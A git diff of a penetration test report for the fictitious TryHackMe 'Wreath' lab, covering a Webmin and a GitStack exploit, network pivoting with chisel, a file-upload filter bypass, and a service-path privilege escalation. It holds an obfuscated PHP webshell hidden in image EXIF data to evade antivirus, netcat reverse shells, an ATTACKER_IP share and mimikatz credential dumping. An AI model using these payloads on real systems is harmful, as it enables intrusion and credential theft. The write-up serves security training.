@@ -1,13 +1,17 @@
-# Penetration Test Report - Wreath
+# Wreath - Penetration Test Report
+
+> Note: This is based on a fictitious engagement accessed through [Tryhackme](https://tryhackme.com/room/wreath)
 
 ## Table of Contents
 
-- Executive Summary
-- Timelines
-- Targets - Findings and Remediations
-- Conclusion
-- References
-- Appendices
+- [Executive Summary](#executive-summary)
+- Findings and Remediations
+  1. [Webserver (`.200`)](#1-webserver-200)
+  2. [Pivoting with Webserver (`.200`)](#2-pivoting-with-webserver-200)
+  3. [gitserver (`.150`)](#3-gitserver-150)
+  4. [Personal PC (`.100`)](#4-personal-pc-100)
+- [Conclusion](#conclusion)
+- [References](#references)
 
 _____________________________________
 
@@ -21,28 +25,6 @@ By the end of the engagement, several vulnerabilities were found with suggested 
 
 _____________________________________
 
-## Timeline
-
-The sequence is as follows:
-1. [Webserver (`.200`)](#1-webserver-200)
-   1. enumeration
-   2. exploitation
-   3. maintain access
-2. [Pivoting with Webserver (`.200`)](#2-pivoting-with-webserver-200)
-3. [gitserver (`.150`)](#3-gitserver-150)
-   1. enumeration
-   2. exploitation
-   3. maintain access
-4. [Personal PC (`.100`)](#4-personal-pc-100)
-   1. enumeration
-   2. code review
-   3. exploitation
-   4. maintain access
-
-_____________________________________
-
-## Targets
-
 ## 1. Webserver (`.200`)
 
 ### Findings
@@ -51,7 +33,7 @@ _____________________________________
 - ssh private keys was obtained after getting root access
 - ssh on port 22 was enabled which allowed us to maintain access
 
-<details>
+<details open>
 <summary>Attack Narrative</summary>
 <br>
 
@@ -166,10 +148,6 @@ uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfi
 
 _____________________________________
 
-### Clean up
-
-- TODO
-
 
 </details>
 <br>
@@ -189,7 +167,7 @@ _____________________________________
 - Host `.100` have filtered ports 
 - Host `.150` have open ports that we can further enumerate on
 
-<details>
+<details open>
 <summary>Attack Narrative</summary>
 <br>
 
@@ -269,12 +247,16 @@ Nmap done: 1 IP address (1 host up) scanned in 574.74 seconds
 
 It is still unknown what this server is and more enumeration is required
 
+### Clean up
+
+- Delete /tmp/nmap-Neozer0
+
 </details>
 <br>
 
 ### Remediation
 
-- TODO
+- None
 
 _____________________________________
 
@@ -283,11 +265,11 @@ _____________________________________
 ### Findings
 
 - Ports `80`, `3389`, `5986` are open
-- git server running `gitstack`
-- Vulnerable to unauthenticated RCE on `gitstack < v2.3.10`
+- gitserver running `gitstack`
+- gitserver vulnerable to unauthenticated RCE on `gitstack v2.3.10`
 - Using rdp we were able to run mimikatz and obtain hashes for persistence
 
-<details>
+<details open>
 <summary>Attack Narrative</summary>
 <br>
 
@@ -295,7 +277,7 @@ _____________________________________
 
 ### Perform a port scan 
 
-Scanning ports for `.150` returns results
+Scanning ports for `.150` revels port 80, 3389 and 5985 are open
 ```
 [root@prod-serv tmp]# ./nmap-Neozer0 -p1-15000 10.200.85.150
 
@@ -582,13 +564,14 @@ _____________________________________
 - Delete `/tmp/socat-Neozer0` - webserver
 - Delete `/Neozer0-exploit.php` - gitserver
 - Delete user `Neozer0` - gitserver
+- Remove firewall port open rule on port 29999
 
 </details>
 <br>
 
 ### Remediation
 
-- TODO
+- Update GitStack to the latest version
 
 _____________________________________
 
@@ -603,10 +586,10 @@ _____________________________________
 - There are two filters on the upload feature to bypass
   - File extension
   - Image size
-- php injected into `Comment` of the image metadata allows us to get a webshell
+- php injected into `Comment` of the image exifdata allows us to get a webshell
 - Misconfigured privilege found on `SystemExplorerHelpService` execution path allowing us to inject our own executable and obtain shell running as root
 
-<details>
+<details open>
 <summary>Attack Narrative</summary>
 <br>
 
@@ -619,7 +602,6 @@ First we run evil-winrm with `-s` to specify path to scan script `Invoke-Portsca
 Performing portscans reveal ports `80` and `3389` are open
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.85.100 -TopPorts 50
-
 
 Hostname      : 10.200.85.100
 alive         : True
@@ -639,7 +621,7 @@ Because the Personal PC port 80 is only opened to the gitserver `.150`, we need 
 
 Chisel forward proxy is a good option with sshuttle being used.
 
-1. Open up a port in Windows firewall (we chose port 34999 here) - `netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT`
+1. Open up a port in Windows firewall (we chose port 34999 here)
 
 ```
 *Evil-WinRM* PS C:\Users\Administrator\Documents> netsh advfirewall firewall add rule name="Chisel-Neozer0" dir=in action=allow protocol=tcp localport=34999
@@ -651,13 +633,6 @@ Ok.
 ```
 kali@kali:~/thm/wreath$ chisel client 10.200.85.150:34999 9090:socks
 2021/04/22 06:34:39 client: Connecting to ws://10.200.85.150:34999
-2021/04/22 06:34:39 client: tun: proxy#127.0.0.1:9090=>socks: Listening
-2021/04/22 06:35:24 client: Connection error: read tcp 10.50.86.79:40978->10.200.85.150:34999: i/o timeout
-2021/04/22 06:35:24 client: Retrying in 100ms...
-2021/04/22 06:36:09 client: Connection error: read tcp 10.50.86.79:40980->10.200.85.150:34999: i/o timeout (Attempt: 1)
-2021/04/22 06:36:09 client: Retrying in 200ms...
-2021/04/22 06:36:54 client: Connection error: read tcp 10.50.86.79:40982->10.200.85.150:34999: i/o timeout (Attempt: 2)
-2021/04/22 06:36:54 client: Retrying in 400ms...
 2021/04/22 06:37:28 client: Connected (Latency 262.542935ms)
 ```
 
@@ -681,11 +656,9 @@ chisel-Neozer0.exe : 2021/04/22 11:37:19 server: Fingerprint 4YNhTCGX+gcPiJEUdmR
 ![foxyproxy setting](foxyproxysetting.png)
 
 5. visit 10.200.85.100 - this is a clone of Thomas' personal website
-6. Using Wappalyzer to detect php is used on this page
+6. Using Wappalyzer we detect php version used on this page
 
 ![local web server](wapplocalwebserver.png)
-
-Further enumeration is required
 
 _____________________________________
 
@@ -705,44 +678,14 @@ Mode                LastWriteTime         Length Name
 d-----         1/2/2021   7:05 PM                Website.git
 ```
 
-Download the entire directory and use GitTools to analyse commits
-
+Download the entire directory and use GitTools to analyse commits and use GitTools to extract git
 ```
-*Evil-WinRM* PS C:\GitStack\repositories> download Website.git
-Info: Downloading C:\GitStack\repositories\Website.git to Website.git
-
-Info: Download successful!
-```
-
-Rename the downloaded folder 
-```
-kali@kali:~/thm/wreath$ mv Website.git/C\:\\GitStack\\repositories\\Website.git/ Website.git/.git
-kali@kali:~/thm/wreath$ ls -la Website.git/
-total 12
-drwxr-xr-x 3 kali kali 4096 Apr 22 07:20 .
-drwxr-xr-x 7 kali kali 4096 Apr 22 07:07 ..
-drwxr-xr-x 5 kali kali 4096 Apr 22 07:09 .git
-```
-
-We then use GitTools to extract some data
-```
-kali@kali:~/thm/wreath$ ls -la gitserver/downloaded-website/
-total 12
-drwxr-xr-x 3 kali kali 4096 Apr 23 06:44 .
-drwxr-xr-x 3 kali kali 4096 Apr 23 06:44 ..
-drwxr-xr-x 6 kali kali 4096 Apr 23 06:40 .git
-kali@kali:~/thm/wreath$ ls GitTools/
-Dumper  Extractor  Finder  LICENSE.md  README.md
 kali@kali:~/thm/wreath$ ./GitTools/Extractor/extractor.sh gitserver/downloaded-website/ gitserver/Website                                                                                             
 ###########
 # Extractor is part of https://github.com/internetwache/GitTools
-#
-# Developed and maintained by @gehaxelt from @internetwache
-#
-# Use at your own risk. Usage might be illegal in certain circumstances. 
-# Only for educational purposes!
-###########
-[*] Destination folder does not exist
+
+...
+
 [*] Creating...
 [+] Found commit: 70dde80cc19ec76704567996738894828f4ee895
 [+] Found folder: /home/kali/thm/wreath/gitserver/Website/0-70dde80cc19ec76704567996738894828f4ee895/css                                                                                              
@@ -750,24 +693,14 @@ kali@kali:~/thm/wreath$ ./GitTools/Extractor/extractor.sh gitserver/downloaded-w
 [+] Found file: /home/kali/thm/wreath/gitserver/Website/0-70dde80cc19ec76704567996738894828f4ee895/css/bootstrap.min.css
 ```
 
-We see the extracted directories are commits but are not sorted by date
+We see the extracted directories are commits
 ```
 kali@kali:~/thm/wreath/gitserver/Website$ ls
 0-70dde80cc19ec76704567996738894828f4ee895  2-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
 1-345ac8b236064b431fa43f53d91c98c4834ef8f3
 ```
 
-Inside each commit folder, there is a `commit-meta.txt` which tells us more info
-```
-kali@kali:~/thm/wreath/gitserver/Website$ cat 0-70dde80cc19ec76704567996738894828f4ee895/commit-meta.txt 
-tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
-author twreath <me@thomaswreath.thm> 1604849458 +0000
-committer twreath <me@thomaswreath.thm> 1604849458 +0000
-
-Static Website Commit
-```
-
-We use a bash one liner to loop through all the folders `commit-meta.txt` and cat them out `separator="====="; for i in $(ls); do printf "\n\n$separator\n$i\n$(cat $i/commit-meta.txt)";done`
+We use a bash one liner to loop through all the folders `commit-meta.txt` and read out more details
 
 ```
 kali@kali:~/thm/wreath/gitserver/Website$ separator="====="; for i in $(ls); do printf "\n\n$separator\n$i\n$(cat $i/commit-meta.txt)";done
@@ -800,36 +733,19 @@ committer twreath <me@thomaswreath.thm> 1608592351 +0000
 Initial Commit for the back-end
 ```
 
-There are three commit messages here `Static Website Commit`, `Updated the filter`, `Initial Commit for the back-end`. 
-
-Commit without a parent would be the first one. The commits are in these order:
+The commits are in these order:
 1. `Static Website Commit` - `70dde80cc19ec76704567996738894828f4ee895`
 2. `Initial Commit for the back-end` - `82dfc97bec0d7582d485d9031c09abcb5c6b18f2`
 3. `Updated the filter` - `345ac8b236064b431fa43f53d91c98c4834ef8f3`
 
-Now we head into the folder `345ac8b236064b431fa43f53d91c98c4834ef8f3`
-
-```
-kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ ls -la
-total 68
-drwxr-xr-x 7 kali kali  4096 Apr 23 06:45 .
-drwxr-xr-x 5 kali kali  4096 Apr 23 06:45 ..
--rw-r--r-- 1 kali kali   225 Apr 23 06:45 commit-meta.txt
-drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 css
--rw-r--r-- 1 kali kali 17340 Apr 23 06:45 favicon.png
-drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 fonts
-drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 img
--rw-r--r-- 1 kali kali 15383 Apr 23 06:45 index.html
-drwxr-xr-x 2 kali kali  4096 Apr 23 06:45 js
-drwxr-xr-x 3 kali kali  4096 Apr 23 06:45 resources
-```
-
-We use the `find` command to look for php files
+We look for php files in the folder `345ac8b236064b431fa43f53d91c98c4834ef8f3`
 
 ```
 kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef8f3$ find . -name "*.php"
 ./resources/index.php
 ```
+
+Partial of index.php:
 
 ```php
 <?php
@@ -837,69 +753,11 @@ kali@kali:~/thm/wreath/gitserver/Website/1-345ac8b236064b431fa43f53d91c98c4834ef
         if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                 $target = "uploads/".basename($_FILES["file"]["name"]);
                 $goodExts = ["jpg", "jpeg", "png", "gif"];
-                if(file_exists($target)){
-                        header("location: ./?msg=Exists");
-                        die();
-                }
-                $size = getimagesize($_FILES["file"]["tmp_name"]);
-                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
-                        header("location: ./?msg=Fail");
-                        die();
-                }
-                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
-                header("location: ./?msg=Success");
-                die();
-        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
-                header("location: ./?msg=Method");
-        }
+...
 
-
-        if(isset($_GET["msg"])){
-                $msg = $_GET["msg"];
-                switch ($msg) {
-                        case "Success":
-                                $res = "File uploaded successfully!";
-                                break;
-                        case "Fail":
-                                $res = "Invalid File Type";
-                                break;
-                        case "Exists":
-                                $res = "File already exists";
-                                break;
-                        case "Method":
-                                $res = "No file send";
-                                break;
-
-                }
-        }
-?>
-<!DOCTYPE html>
-<html lang=en>
         <!-- ToDo:
-                  - Finish the styling: it looks awful
-                  - Get Ruby more food. Greedy animal is going through it too fast
                   - Upgrade the filter on this page. Can't rely on basic auth for everything
-                  - Phone Mrs Walker about the neighbourhood watch meetings
-        -->
-        <head>
-                <title>Ruby Pictures</title>
-                <meta charset="utf-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <link rel="stylesheet" type="text/css" href="assets/css/Andika.css">
-                <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
-        </head>
-        <body>
-                <main>
-                        <h1>Welcome Thomas!</h1>
-                        <h2>Ruby Image Upload Page</h2>
-                        <form method="post" enctype="multipart/form-data">
-                                <input type="file" name="file" id="fileEntry" required, accept="image/jpeg,image/png,image/gif">
-                                <input type="submit" name="upload" id="fileSubmit" value="Upload">
-                        </form>
-                        <p id=res><?php if (isset($res)){ echo $res; };?></p>
-                </main>
-        </body>
-</html>
+                  
 ```
 
 Interesting part is the filters here
@@ -917,11 +775,11 @@ $size = getimagesize($_FILES["file"]["tmp_name"]);
 ```
 
 This line checks for two conditions, if either fails, we get error message.
-- Second condition checks if the file is not an image
 - First condition split string by `.` into an array and checks second item
   - `image.jpeg` returns `["image", "jpeg"]`
   - But `image.jpeg.php` returns `["image","jpeg","php"]` and `jpeg` gets passed into the filter
   - This filter then checks if it is not in the array of `$goodExts`
+- Second condition checks if the file is not an image
 
 After two conditions pass, the file gets moved into `uploads/` directory with original name
 ```php
@@ -946,7 +804,8 @@ we can visit `http://10.200.85.100/resources` where we are greeted with a login 
 Try Thomas' hash that we cracked earlier
 
 User: Thomas
-Password: i<3ruby
+
+Password: *******
 
 .. And we're in
 
@@ -972,29 +831,12 @@ File Name                       : test-Neozer0.jpeg.php
 Directory                       : .
 File Size                       : 45 KiB
 File Modification Date/Time     : 2021:04:23 09:30:57-04:00
-File Access Date/Time           : 2021:04:23 09:30:57-04:00
-File Inode Change Date/Time     : 2021:04:23 09:30:57-04:00
-File Permissions                : rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-Resolution Unit                 : None
-X Resolution                    : 1
-Y Resolution                    : 1
-Image Width                     : 750
-Image Height                    : 750
-Encoding Process                : Progressive DCT, Huffman coding
-Bits Per Sample                 : 8
-Color Components                : 3
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
-Image Size                      : 750x750
-Megapixels                      : 0.562
+...
 ```
 
 There is also AV installed on this target. It may detect any default PHP webshell uploaded and alert the victim. The first step then is to create a proof of concept before we can work out an AV bypass.
 
-Harmess PHP payload - `<?php echo "<pre>Test Payload</pre>"; die();?>` 
+Harmless PHP payload - `<?php echo "<pre>Test Payload</pre>"; die();?>` 
 
 We add this to the image with exiftool
 ```
@@ -1005,25 +847,12 @@ File Name                       : test-Neozer0.jpeg.php
 Directory                       : .
 File Size                       : 45 KiB
 File Modification Date/Time     : 2021:04:23 09:35:37-04:00
-File Access Date/Time           : 2021:04:23 09:35:37-04:00
-File Inode Change Date/Time     : 2021:04:23 09:35:37-04:00
-File Permissions                : rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-Resolution Unit                 : None
-X Resolution                    : 1
-Y Resolution                    : 1
+
+...
+
 Comment                         : <?php echo "<pre>Test Payload</pre>"; die(); ?>
-Image Width                     : 750
-Image Height                    : 750
-Encoding Process                : Progressive DCT, Huffman coding
-Bits Per Sample                 : 8
-Color Components                : 3
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
-Image Size                      : 750x750
-Megapixels                      : 0.562
+
+...
 ```
 
 Now we upload this benign payload and access it on the browser to see that the test payload has worked and we are able to execute PHP code on the system!
@@ -1049,28 +878,11 @@ Payload:
 ?>
 ```
 
-This payload:
-- Checks if `GET` parameter called `wreath` has been set
-- If set, `shell_exec()` executes (lives in `<pre>` tag for clean output)
-- Use `die()` to prevent rest of garble text from image showing up
+We use online [php obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) with all obfuscation options set and we get:
 
-This is slighly longer than the standard `<?php system($_GET["cmd"]);?>` because
-- Obfuscating will become one liner anyway
-- Being different is good for AV evasion
-
-With the payload, we now obfuscate it by:
-- Switch parts of exploit around so they are in unusual order
-- Encoding all the strings
-- Splitting up distinctive parts of the code (eg. `shell_exec($_GET[...])`)
-
-Here we use online [php obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) with all obfuscation options set and we get:
 ```php
-<?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
+<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>
 ```
-
-The payload will need some escaping because `$` will be interpreted as bash variables
-
-`<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>`
 
 Make a new copy of the image and inject our new payload
 ```
@@ -1084,24 +896,12 @@ Directory                       : .
 File Size                       : 46 KiB
 File Modification Date/Time     : 2021:04:24 08:24:07-04:00
 File Access Date/Time           : 2021:04:24 08:24:07-04:00
-File Inode Change Date/Time     : 2021:04:24 08:24:07-04:00
-File Permissions                : rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-Resolution Unit                 : None
-X Resolution                    : 1
-Y Resolution                    : 1
+
+...
+
 Comment                         : <?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
-Image Width                     : 750
-Image Height                    : 750
-Encoding Process                : Progressive DCT, Huffman coding
-Bits Per Sample                 : 8
-Color Components                : 3
-Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
-Image Size                      : 750x750
-Megapixels                      : 0.562
+
+...
 ```
 
 Visiting the page we get
@@ -1195,23 +995,23 @@ NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory gro
 Mandatory Label\High Mandatory Level Label            S-1-16-12288 
 ```
 
+Check services
+
 ```
 C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
 DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
-Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
-Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
-AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
-LSM                                                                                 LSM                                                                                                                                   Unknown    
-Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
-NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
-Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
-System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
-Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
-Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
-Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual     
+Amazon SSM Agent                                                                    AmazonSSMAgent                                                 
 
+...
+
+SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
+Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  
+
+...  
 ```
+
+Check the path of the binary of `SystemExplorerHelpService`
 
 ```
 C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
@@ -1230,6 +1030,8 @@ SERVICE_NAME: SystemExplorerHelpService
         SERVICE_START_NAME : LocalSystem
 ```
 
+We also have access to add files in the path!
+
 ```
 C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
@@ -1242,22 +1044,8 @@ Access : BUILTIN\Users Allow  FullControl
          NT SERVICE\TrustedInstaller Allow  FullControl
          NT SERVICE\TrustedInstaller Allow  268435456
          NT AUTHORITY\SYSTEM Allow  FullControl
-         NT AUTHORITY\SYSTEM Allow  268435456
-         BUILTIN\Administrators Allow  FullControl
-         BUILTIN\Administrators Allow  268435456
-         BUILTIN\Users Allow  ReadAndExecute, Synchronize
-         BUILTIN\Users Allow  -1610612736
-         CREATOR OWNER Allow  268435456
-         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
-         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
-         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
-         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
-Audit  : 
-Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
-         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
-         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
-         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
-         ;;S-1-15-2-2)
+
+...
 ```
 
 Two findings:
@@ -1307,10 +1095,8 @@ Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corpo
 
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
+
+...
 ```
 
 In the reverse shell we run
@@ -1457,17 +1243,35 @@ _____________________________________
 
 ### Clean up
 
+- delete c:\windows\temp\chisel-Neozer0.exe
 - delete c:\windows\temp\nc-Neozer0.exe
 - delete resources/uploads/shell-Neozer0.jpeg.php
-- stop sharing service `net use \\ATTACKER_IP\share /del`
-- `del "C:\Program Files (x86)\System Explorer\System.exe"`
-- `sc start SystemExplorerHelpService`
+- stop sharing service `net use \\ATTACKER_IP\share /del` on the attacking machine
+- Remove our crafted program - `del "C:\Program Files (x86)\System Explorer\System.exe"`
+- Restart the service - `sc start SystemExplorerHelpService`
 
 </details>
 
 ### Remediation
 
-- TODO
+- Fix file extension filter bypass that allows `.jpeg.php` files to be uploaded
+- Keep using allowlist which are better than blocklist
+
+_____________________________________
+
+## Conclusion
+
+A combination of vulnerabilities allowed us to pivot through multiple entities and obtaining the highest access. The main vulnerabilities of note are:
+
+- Webserver (`.200`) vulnerability
+- Gitserver (`.150`) vulnerability 
+- Personal PC (`.100`) upload filters vulnerability
+
+It is recommended to:
+- Upgrade Webmin and Gitstack to the latest version as detailed in the remediation part of the report
+- Improve extensions type filter bypass within Thomas' webpage
+
+_____________________________________
 
 ## References
 
@@ -1476,3 +1280,5 @@ CVE-2019-15107: https://www.cvedetails.com/cve/CVE-2019-15107/
 Webserver exploit: https://github.com/MuirlandOracle/CVE-2019-15107
 
 Gitstack: https://www.exploit-db.com/exploits/43777
+
+PHP obfuscator: https://www.gaijin.at/en/tools/php-obfuscator
